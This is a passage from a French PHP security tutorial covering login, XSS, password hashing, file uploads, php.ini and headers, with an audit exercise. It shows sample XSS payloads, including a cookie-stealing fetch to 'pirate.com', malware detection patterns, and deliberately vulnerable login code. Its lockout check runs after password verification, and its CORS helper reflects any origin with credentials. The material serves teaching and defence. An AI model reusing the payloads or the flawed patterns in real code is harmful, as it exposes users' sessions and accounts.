                return ['success' =&gt; false, 'message' =&gt; 'Identifiants incorrects'];
            }
            
            // 3. Vérification du hash (pas de comparaison directe !)
            if (!password_verify($password, $user['password_hash'])) {
                $this-&gt;logFailedAttempt($email);
                $this-&gt;incrementFailedAttempts($user['id']);
                return ['success' =&gt; false, 'message' =&gt; 'Identifiants incorrects'];
            }
            
            // 4. Vérifier les tentatives de force brute
            if ($this-&gt;isBlocked($user)) {
                return ['success' =&gt; false, 'message' =&gt; 'Compte temporairement bloqué'];
            }
            
            // 5. Connexion réussie - réinitialiser les tentatives
            $this-&gt;resetFailedAttempts($user['id']);
            
            return [
                'success' =&gt; true,
                'user' =&gt; [
                    'id' =&gt; $user['id'],
                    'name' =&gt; $user['name'],
                    'email' =&gt; $user['email']
                ]
            ];
            
        } catch (PDOException $e) {
            error_log("Erreur auth : " . $e-&gt;getMessage());
            return ['success' =&gt; false, 'message' =&gt; 'Erreur système'];
        }
    }
    
    private function incrementFailedAttempts($userId) {
        $sql = "UPDATE users 
                SET failed_attempts = failed_attempts + 1, 
                    last_attempt = NOW() 
                WHERE id = :id";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $userId]);
    }
    
    private function resetFailedAttempts($userId) {
        $sql = "UPDATE users 
                SET failed_attempts = 0, 
                    last_attempt = NULL 
                WHERE id = :id";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $userId]);
    }
    
    private function isBlocked($user) {
        // Bloquer après 5 tentatives pendant 15 minutes
        if ($user['failed_attempts'] &gt;= 5) {
            $lastAttempt = new DateTime($user['last_attempt']);
            $now = new DateTime();
            $diff = $now-&gt;getTimestamp() - $lastAttempt-&gt;getTimestamp();
            
            return $diff &lt; 900; // 15 minutes = 900 secondes
        }
        
        return false;
    }
    
    private function logFailedAttempt($email) {
        // Log des tentatives pour analyse
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        error_log("Failed login attempt: email=$email, ip=$ip, ua=$userAgent");
    }
}
?&gt;</code></pre>

    <h3>20.2 Protection contre XSS (Cross-Site Scripting)</h3>
    
    <p>Les attaques <strong>XSS</strong> consistent à injecter du code JavaScript malveillant dans votre site pour voler des données ou rediriger les utilisateurs.</p>

    <h4>Types d'attaques XSS :</h4>
    <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #ffc107;">
        <h5>⚠️ Exemples d'attaques :</h5>
        <pre><code>// Dans un commentaire ou un formulaire :
&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;

// Vol de cookies :
&lt;script&gt;
    fetch('http://pirate.com/steal.php?cookie=' + document.cookie);
&lt;/script&gt;

// Redirection malveillante :
&lt;script&gt;window.location = 'http://site-malveillant.com';&lt;/script&gt;

// Dans une URL :
http://monsite.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
    </div>

    <h4>✅ Protection complète contre XSS :</h4>
    <pre><code>&lt;?php
class XSSProtection {
    
    // Échapper pour l'affichage HTML
    public static function escape($data) {
        if (is_array($data)) {
            return array_map([self::class, 'escape'], $data);
        }
        
        return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
    
    // Nettoyer les données d'entrée
    public static function clean($data) {
        if (is_array($data)) {
            return array_map([self::class, 'clean'], $data);
        }
        
        // Supprimer les tags dangereux
        $data = strip_tags($data, '&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;br&gt;&lt;p&gt;&lt;a&gt;');
        
        // Nettoyer les attributs des liens
        $data = preg_replace_callback(
            '/&lt;a\s+([^&gt;]*?)href\s*=\s*["\']([^"\']*?)["\']([^&gt;]*?)&gt;/i',
            function($matches) {
                $url = $matches[2];
                
                // Vérifier que l'URL est sûre
                if (preg_match('/^(https?:\/\/|\/)/i', $url)) {
                    return "&lt;a href=\"" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "\"&gt;";
                } else {
                    return "&lt;a&gt;"; // Supprimer le lien suspect
                }
            },
            $data
        );
        
        return trim($data);
    }
    
    // Valider et nettoyer une URL
    public static function sanitizeUrl($url) {
        // Supprimer les espaces
        $url = trim($url);
        
        // Vérifier le format de base
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return false;
        }
        
        // Vérifier le protocole
        $parsed = parse_url($url);
        if (!in_array($parsed['scheme'] ?? '', ['http', 'https'])) {
            return false;
        }
        
        return $url;
    }
    
    // Générer un token CSRF
    public static function generateCSRFToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
    
    // Vérifier un token CSRF
    public static function verifyCSRFToken($token) {
        return isset($_SESSION['csrf_token']) && 
               hash_equals($_SESSION['csrf_token'], $token);
    }
}

// Exemple d'utilisation dans les vues
class SafeView {
    
    public static function render($viewName, $data = []) {
        // Échapper automatiquement toutes les données
        $safeData = XSSProtection::escape($data);
        
        // Extraire pour la vue
        extract($safeData);
        
        // Générer un token CSRF pour les formulaires
        $csrfToken = XSSProtection::generateCSRFToken();
        
        include "views/$viewName.php";
    }
    
    // Afficher du HTML "sûr" (déjà nettoyé)
    public static function raw($html) {
        return $html; // À utiliser avec précaution !
    }
    
    // Afficher une URL sécurisée
    public static function url($url) {
        $safeUrl = XSSProtection::sanitizeUrl($url);
        return $safeUrl ? htmlspecialchars($safeUrl, ENT_QUOTES, 'UTF-8') : '#';
    }
}

// Utilisation dans un contrôleur
class CommentController extends Controller {
    
    public function store() {
        // Vérifier le token CSRF
        if (!XSSProtection::verifyCSRFToken($_POST['_token'] ?? '')) {
            return $this-&gt;json(['error' =&gt; 'Token CSRF invalide'], 403);
        }
        
        // Nettoyer les données
        $cleanData = [
            'name' =&gt; XSSProtection::clean($_POST['name'] ?? ''),
            'email' =&gt; filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL),
            'comment' =&gt; XSSProtection::clean($_POST['comment'] ?? ''),
            'article_id' =&gt; intval($_POST['article_id'] ?? 0)
        ];
        
        // Validation
        $errors = $this-&gt;validate($cleanData, [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2],
            'email' =&gt; ['required' =&gt; true, 'email' =&gt; true],
            'comment' =&gt; ['required' =&gt; true, 'min' =&gt; 10]
        ]);
        
        if (!empty($errors)) {
            return $this-&gt;json(['errors' =&gt; $errors], 400);
        }
        
        // Sauvegarder en base (les données sont déjà nettoyées)
        $commentModel = new Comment();
        $commentId = $commentModel-&gt;create($cleanData);
        
        return $this-&gt;json(['success' =&gt; true, 'comment_id' =&gt; $commentId]);
    }
}
?&gt;</code></pre>

    <h3>20.3 Gestion sécurisée des mots de passe</h3>
    
    <h4>Hash et vérification des mots de passe :</h4>
    <pre><code>&lt;?php
class PasswordSecurity {
    
    // Générer un hash sécurisé
    public static function hash($password) {
        // Utiliser PASSWORD_DEFAULT (actuellement bcrypt, évoluera avec PHP)
        return password_hash($password, PASSWORD_DEFAULT, [
            'cost' =&gt; 12 // Coût adapté aux performances actuelles
        ]);
    }
    
    // Vérifier un mot de passe
    public static function verify($password, $hash) {
        return password_verify($password, $hash);
    }
    
    // Vérifier si le hash doit être mis à jour
    public static function needsRehash($hash) {
        return password_needs_rehash($hash, PASSWORD_DEFAULT, ['cost' =&gt; 12]);
    }
    
    // Valider la force d'un mot de passe
    public static function validateStrength($password) {
        $errors = [];
        
        // Longueur minimale
        if (strlen($password) &lt; 8) {
            $errors[] = "Le mot de passe doit faire au moins 8 caractères";
        }
        
        // Au moins une minuscule
        if (!preg_match('/[a-z]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins une minuscule";
        }
        
        // Au moins une majuscule
        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins une majuscule";
        }
        
        // Au moins un chiffre
        if (!preg_match('/\d/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins un chiffre";
        }
        
        // Au moins un caractère spécial
        if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins un caractère spécial";
        }
        
        // Vérifier contre les mots de passe communs
        if (self::isCommonPassword($password)) {
            $errors[] = "Ce mot de passe est trop commun";
        }
        
        return $errors;
    }
    
    // Vérifier contre une liste de mots de passe communs
    private static function isCommonPassword($password) {
        $commonPasswords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'Password1', 'password123', 'admin', 'letmein', 'welcome',
            'monkey', '1234567890', 'iloveyou', 'princess', 'rockyou'
        ];
        
        return in_array(strtolower($password), array_map('strtolower', $commonPasswords));
    }
    
    // Générer un mot de passe temporaire sécurisé
    public static function generateTemporary($length = 12) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*';
        $password = '';
        
        for ($i = 0; $i &lt; $length; $i++) {
            $password .= $chars[random_int(0, strlen($chars) - 1)];
        }
        
        return $password;
    }
}

// Exemple d'utilisation
class UserRegistration {
    private $userModel;
    
    public function __construct() {
        $this-&gt;userModel = new User();
    }
    
    public function register($data) {
        // Validation du mot de passe
        $passwordErrors = PasswordSecurity::validateStrength($data['password']);
        
        if (!empty($passwordErrors)) {
            return ['success' =&gt; false, 'errors' =&gt; $passwordErrors];
        }
        
        // Vérifier que les mots de passe correspondent
        if ($data['password'] !== $data['password_confirm']) {
            return ['success' =&gt; false, 'errors' =&gt; ['Les mots de passe ne correspondent pas']];
        }
        
        // Vérifier que l'email n'existe pas déjà
        if ($this-&gt;userModel-&gt;findByEmail($data['email'])) {
            return ['success' =&gt; false, 'errors' =&gt; ['Cet email est déjà utilisé']];
        }
        
        // Hasher le mot de passe
        $hashedPassword = PasswordSecurity::hash($data['password']);
        
        // Créer l'utilisateur
        $userData = [
            'name' =&gt; XSSProtection::clean($data['name']),
            'email' =&gt; filter_var($data['email'], FILTER_SANITIZE_EMAIL),
            'password_hash' =&gt; $hashedPassword,
            'created_at' =&gt; date('Y-m-d H:i:s'),
            'email_verified' =&gt; 0
        ];
        
        $userId = $this-&gt;userModel-&gt;create($userData);
        
        // Envoyer un email de confirmation (à implémenter)
        $this-&gt;sendVerificationEmail($userData['email'], $userId);
        
        return ['success' =&gt; true, 'user_id' =&gt; $userId];
    }
    
    public function changePassword($userId, $currentPassword, $newPassword) {
        $user = $this-&gt;userModel-&gt;findById($userId);
        
        if (!$user || !PasswordSecurity::verify($currentPassword, $user['password_hash'])) {
            return ['success' =&gt; false, 'error' =&gt; 'Mot de passe actuel incorrect'];
        }
        
        // Valider le nouveau mot de passe
        $errors = PasswordSecurity::validateStrength($newPassword);
        if (!empty($errors)) {
            return ['success' =&gt; false, 'errors' =&gt; $errors];
        }
        
        // Mettre à jour
        $newHash = PasswordSecurity::hash($newPassword);
        $this-&gt;userModel-&gt;update($userId, [
            'password_hash' =&gt; $newHash,
            'password_changed_at' =&gt; date('Y-m-d H:i:s')
        ]);
        
        return ['success' =&gt; true];
    }
}
?&gt;</code></pre>

    <h3>20.4 Upload de fichiers sécurisé</h3>
    
    <h4>Protection complète contre les uploads malveillants :</h4>
    <pre><code>&lt;?php
class SecureFileUpload {
    private $allowedMimeTypes = [
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/pdf', 'text/plain',
        'application/msword', 
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    
    private $allowedExtensions = [
        'jpg', 'jpeg', 'png', 'gif', 'webp',
        'pdf', 'txt', 'doc', 'docx'
    ];
    
    private $maxFileSize = 5242880; // 5 MB
    private $uploadPath = 'uploads/';
    
    public function upload($file, $category = 'general') {
        // Vérifications de base
        $errors = $this-&gt;validateUpload($file);
        if (!empty($errors)) {
            return ['success' =&gt; false, 'errors' =&gt; $errors];
        }
        
        // Créer un nom de fichier sécurisé
        $safeFileName = $this-&gt;generateSafeFileName($file['name']);
        $uploadDir = $this-&gt;uploadPath . $category . '/';
        
        // Créer le dossier si nécessaire
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        
        $fullPath = $uploadDir . $safeFileName;
        
        // Vérifications de sécurité supplémentaires
        if (!$this-&gt;isSecureFile($file['tmp_name'], $file['type'])) {
            return ['success' =&gt; false, 'errors' =&gt; ['Fichier potentiellement dangereux détecté']];
        }
        
        // Déplacer le fichier
        if (move_uploaded_file($file['tmp_name'], $fullPath)) {
            // Post-traitement de sécurité
            $this-&gt;secureFile($fullPath, $file['type']);
            
            return [
                'success' =&gt; true,
                'filename' =&gt; $safeFileName,
                'path' =&gt; $fullPath,
                'size' =&gt; $file['size'],
                'type' =&gt; $file['type']
            ];
        } else {
            return ['success' =&gt; false, 'errors' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
    
    private function validateUpload($file) {
        $errors = [];
        
        // Vérifier les erreurs d'upload
        if ($file['error'] !== UPLOAD_ERR_OK) {
            $errors[] = "Erreur d'upload : " . $this-&gt;getUploadErrorMessage($file['error']);
        }
        
        // Vérifier la taille
        if ($file['size'] &gt; $this-&gt;maxFileSize) {
            $errors[] = "Fichier trop volumineux (max " . number_format($this-&gt;maxFileSize / 1024 / 1024, 1) . " MB)";
        }
        
        if ($file['size'] == 0) {
            $errors[] = "Le fichier est vide";
        }
        
        // Vérifier l'extension
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;allowedExtensions)) {
            $errors[] = "Extension non autorisée ($extension)";
        }
        
        // Vérifier le type MIME réel
        $realMimeType = mime_content_type($file['tmp_name']);
        if (!in_array($realMimeType, $this-&gt;allowedMimeTypes)) {
            $errors[] = "Type de fichier non autorisé ($realMimeType)";
        }
        
        // Vérifier la cohérence extension/MIME
        if (!$this-&gt;isValidMimeExtensionCombo($realMimeType, $extension)) {
            $errors[] = "Incohérence entre l'extension et le contenu du fichier";
        }
        
        return $errors;
    }
    
    private function isSecureFile($tempPath, $mimeType) {
        // Vérifications spécifiques selon le type
        if (strpos($mimeType, 'image/') === 0) {
            return $this-&gt;isSecureImage($tempPath);
        } elseif ($mimeType === 'application/pdf') {
            return $this-&gt;isSecurePDF($tempPath);
        }
        
        // Vérifications générales
        return $this-&gt;scanForMalware($tempPath);
    }
    
    private function isSecureImage($imagePath) {
        // Vérifier que c'est vraiment une image
        $imageInfo = getimagesize($imagePath);
        if ($imageInfo === false) {
            return false;
        }
        
        // Vérifier les dimensions (éviter les images trop grandes)
        if ($imageInfo[0] &gt; 10000 || $imageInfo[1] &gt; 10000) {
            return false;
        }
        
        // Scanner le contenu pour du code suspect
        $content = file_get_contents($imagePath);
        $suspiciousPatterns = [
            '/&lt;\?php/i', '/&lt;script/i', '/javascript:/i',
            '/eval\(/i', '/base64_decode/i', '/exec\(/i'
        ];
        
        foreach ($suspiciousPatterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function isSecurePDF($pdfPath) {
        // Vérifier la signature PDF
        $handle = fopen($pdfPath, 'rb');
        $header = fread($handle, 8);
        fclose($handle);
        
        return strpos($header, '%PDF-') === 0;
    }
    
    private function scanForMalware($filePath) {
        // Scanner basique pour des signatures connues
        $content = file_get_contents($filePath);
        
        // Patterns suspects
        $malwarePatterns = [
            '/eval\s*\(/i',
            '/base64_decode\s*\(/i',
            '/exec\s*\(/i',
            '/system\s*\(/i',
            '/shell_exec\s*\(/i',
            '/passthru\s*\(/i',
            '/file_get_contents\s*\(\s*["\']http/i'
        ];
        
        foreach ($malwarePatterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function secureFile($filePath, $mimeType) {
        // Changer les permissions
        chmod($filePath, 0644);
        
        // Pour les images, régénérer pour supprimer les métadonnées
        if (strpos($mimeType, 'image/') === 0) {
            $this-&gt;stripImageMetadata($filePath);
        }
    }
    
    private function stripImageMetadata($imagePath) {
        $imageInfo = getimagesize($imagePath);
        if (!$imageInfo) return;
        
        $imageType = $imageInfo[2];
        
        // Recréer l'image pour supprimer les métadonnées
        switch ($imageType) {
            case IMAGETYPE_JPEG:
                $image = imagecreatefromjpeg($imagePath);
                if ($image) {
                    imagejpeg($image, $imagePath, 85);
                    imagedestroy($image);
                }
                break;
                
            case IMAGETYPE_PNG:
                $image = imagecreatefrompng($imagePath);
                if ($image) {
                    imagepng($image, $imagePath, 8);
                    imagedestroy($image);
                }
                break;
        }
    }
    
    private function generateSafeFileName($originalName) {
        // Supprimer l'extension originale
        $name = pathinfo($originalName, PATHINFO_FILENAME);
        $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
        
        // Nettoyer le nom
        $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
        $safeName = substr($safeName, 0, 50); // Limiter la longueur
        
        // Ajouter un identifiant unique
        $uniqueId = uniqid() . '_' . random_int(1000, 9999);
        
        return $uniqueId . '_' . $safeName . '.' . $extension;
    }
    
    private function isValidMimeExtensionCombo($mimeType, $extension) {
        $validCombos = [
            'image/jpeg' =&gt; ['jpg', 'jpeg'],
            'image/png' =&gt; ['png'],
            'image/gif' =&gt; ['gif'],
            'image/webp' =&gt; ['webp'],
            'application/pdf' =&gt; ['pdf'],
            'text/plain' =&gt; ['txt'],
            'application/msword' =&gt; ['doc'],
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document' =&gt; ['docx']
        ];
        
        return isset($validCombos[$mimeType]) && 
               in_array($extension, $validCombos[$mimeType]);
    }
}
?&gt;</code></pre>

    <h3>20.5 Configuration de sécurité PHP</h3>
    
    <h4>php.ini sécurisé pour la production :</h4>
    <pre><code>; === SÉCURITÉ PHP - CONFIGURATION PRODUCTION ===

; Cacher les erreurs aux utilisateurs
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log

; Cacher la version PHP
expose_php = Off

; Limiter les fonctions dangereuses
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; Upload sécurisé
file_uploads = On
upload_max_filesize = 5M
post_max_size = 10M
max_file_uploads = 5

; Session sécurisée
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Strict"
session.use_strict_mode = 1
session.cookie_lifetime = 0
session.gc_maxlifetime = 86400

; Autres sécurités
allow_url_fopen = Off
allow_url_include = Off
max_execution_time = 30
max_input_time = 30
memory_limit = 128M

; Headers de sécurité
; (à configurer aussi via Apache/Nginx)
</code></pre>

    <h3>20.6 Headers de sécurité</h3>
    
    <h4>Configuration des headers sécurisés :</h4>
    <pre><code>&lt;?php
class SecurityHeaders {
    
    public static function setSecurityHeaders() {
        // Protection XSS
        header('X-XSS-Protection: 1; mode=block');
        
        // Empêcher le sniffing de type MIME
        header('X-Content-Type-Options: nosniff');
        
        // Protection contre le clickjacking
        header('X-Frame-Options: DENY');
        
        // Content Security Policy
        header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' cdn.jsdelivr.net; img-src 'self' data:; font-src 'self' cdn.jsdelivr.net");
        
        // Strict Transport Security (HTTPS uniquement)
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
            header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
        }
        
        // Referrer Policy
        header('Referrer-Policy: strict-origin-when-cross-origin');
        
        // Feature Policy
        header("Feature-Policy: geolocation 'none'; microphone 'none'; camera 'none'");
    }
    
    public static function setNoCacheHeaders() {
        header('Cache-Control: no-cache, no-store, must-revalidate, private');
        header('Pragma: no-cache');
        header('Expires: 0');
    }
    
    public static function setCORSHeaders($allowedOrigins = ['*']) {
        $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
        
        if (in_array('*', $allowedOrigins) || in_array($origin, $allowedOrigins)) {
            header("Access-Control-Allow-Origin: $origin");
        }
        
        header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 86400');
    }
}

// Middleware de sécurité
class SecurityMiddleware {
    
    public static function enforce() {
        // Appliquer les headers de sécurité
        SecurityHeaders::setSecurityHeaders();
        
        // Démarrer la session de manière sécurisée
        self::secureSessionStart();
        
        // Vérifier les limites de taux
        self::rateLimiting();
        
        // Vérifier les IP bannies
        self::checkBannedIPs();
    }
    
    private static function secureSessionStart() {
        if (session_status() === PHP_SESSION_NONE) {
            // Configuration de session sécurisée
            ini_set('session.cookie_httponly', 1);
            ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
            ini_set('session.cookie_samesite', 'Strict');
            ini_set('session.use_strict_mode', 1);
            
            session_start();
            
            // Régénérer l'ID de session périodiquement
            if (!isset($_SESSION['session_regenerated'])) {
                session_regenerate_id(true);
                $_SESSION['session_regenerated'] = time();
            } elseif (time() - $_SESSION['session_regenerated'] &gt; 300) {
                session_regenerate_id(true);
                $_SESSION['session_regenerated'] = time();
            }
        }
    }
    
    private static function rateLimiting() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $key = "rate_limit_$ip";
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = ['count' =&gt; 1, 'start' =&gt; time()];
        } else {
            $data = $_SESSION[$key];
            
            // Reset si plus d'une minute
            if (time() - $data['start'] &gt; 60) {
                $_SESSION[$key] = ['count' =&gt; 1, 'start' =&gt; time()];
            } else {
                $_SESSION[$key]['count']++;
                
                // Bloquer si trop de requêtes
                if ($data['count'] &gt; 100) { // 100 requêtes par minute max
                    http_response_code(429);
                    die('Too Many Requests');
                }
            }
        }
    }
    
    private static function checkBannedIPs() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $bannedIPs = [
            // Liste des IP bannies
            // '192.168.1.100',
            // '10.0.0.50'
        ];
        
        if (in_array($ip, $bannedIPs)) {
            http_response_code(403);
            die('Access Forbidden');
        }
    }
}

// Utilisation en début d'application
SecurityMiddleware::enforce();
?&gt;</code></pre>

    <h3>20.7 Checklist finale de sécurité</h3>
    
    <div style="background: linear-gradient(135deg, #e8f5e8 0%, #d4edda 100%); padding: 20px; border-radius: 10px; margin: 20px 0;">
        <h4>✅ Checklist complète de sécurité PHP</h4>
        
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin: 15px 0;">
            <div>
                <h5>🗄️ Base de données :</h5>
                <ul style="margin: 0;">
                    <li>✅ Requêtes préparées uniquement</li>
                    <li>✅ Validation de toutes les entrées</li>
                    <li>✅ Principe du moindre privilège (utilisateur DB)</li>
                    <li>✅ Chiffrement des données sensibles</li>
                    <li>✅ Sauvegardes régulières et chiffrées</li>
                </ul>
            </div>
            
            <div>
                <h5>🔐 Authentification :</h5>
                <ul style="margin: 0;">
                    <li>✅ Hash des mots de passe (password_hash)</li>
                    <li>✅ Politique de mots de passe forts</li>
                    <li>✅ Protection contre la force brute</li>
                    <li>✅ Sessions sécurisées</li>
                    <li>✅ Authentification à deux facteurs</li>
                </ul>
            </div>
            
            <div>
                <h5>🌐 Web :</h5>
                <ul style="margin: 0;">
                    <li>✅ Protection XSS (htmlspecialchars)</li>
                    <li>✅ Protection CSRF (tokens)</li>
                    <li>✅ Headers de sécurité</li>
                    <li>✅ HTTPS partout</li>
                    <li>✅ Validation côté serveur</li>
                </ul>
            </div>
            
            <div>
                <h5>📁 Fichiers :</h5>
                <ul style="margin: 0;">
                    <li>✅ Validation stricte des uploads</li>
                    <li>✅ Dossier uploads hors web root</li>
                    <li>✅ Permissions fichiers appropriées</li>
                    <li>✅ Scan antivirus si possible</li>
                    <li>✅ Pas d'exécution des uploads</li>
                </ul>
            </div>
        </div>
    </div>

    <h3>20.8 Exercice final : Audit de sécurité</h3>
    
    <p><strong>Objectif :</strong> Analyser et corriger les failles de sécurité dans un code vulnérable.</p>
    
    <p><strong>Code à auditer :</strong></p>
    <pre><code>&lt;?php
// ❌ CODE VULNÉRABLE - Trouvez les failles !
session_start();

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "");

if (isset($_POST['login'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
    $result = $pdo-&gt;query($sql);
    $user = $result-&gt;fetch();
    
    if ($user) {
        $_SESSION['user'] = $user;
        header("Location: dashboard.php");
    } else {
        echo "Connexion échouée";
    }
}

if (isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    $user_id = $_SESSION['user']['id'];
    
    $sql = "INSERT INTO comments (user_id, comment) VALUES ($user_id, '$comment')";
    $pdo-&gt;query($sql);
    
    echo "Commentaire : " . $comment;
}

if (isset($_FILES['photo'])) {
    $filename = $_FILES['photo']['name'];
    move_uploaded_file($_FILES['photo']['tmp_name'], "uploads/" . $filename);
    echo "Photo uploadée : " . $filename;
}
?&gt;</code></pre>

    <details>
        <summary><strong>💡 Voir les failles et corrections</strong></summary>
        <pre><code>🔍 FAILLES IDENTIFIÉES :

1. ❌ Injection SQL dans la connexion
2. ❌ Mot de passe en clair (pas de hash)
3. ❌ Pas de validation des données
4. ❌ XSS dans l'affichage du commentaire
5. ❌ Upload de fichier non sécurisé
6. ❌ Session non sécurisée
7. ❌ Pas de protection CSRF
8. ❌ Erreurs révélatrices
9. ❌ Configuration PDO non sécurisée

✅ CODE CORRIGÉ :

&lt;?php
// Configuration sécurisée
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
session_start();

try {
    $pdo = new PDO(
        "mysql:host=localhost;dbname=test;charset=utf8mb4", 
        "user_limited", 
        "strong_password",
        [
            PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES =&gt; false
        ]
    );
} catch (PDOException $e) {
    error_log($e-&gt;getMessage());
    die
       </section>
                </div>
            </div>

        </main>
    </div>
</body>
</html>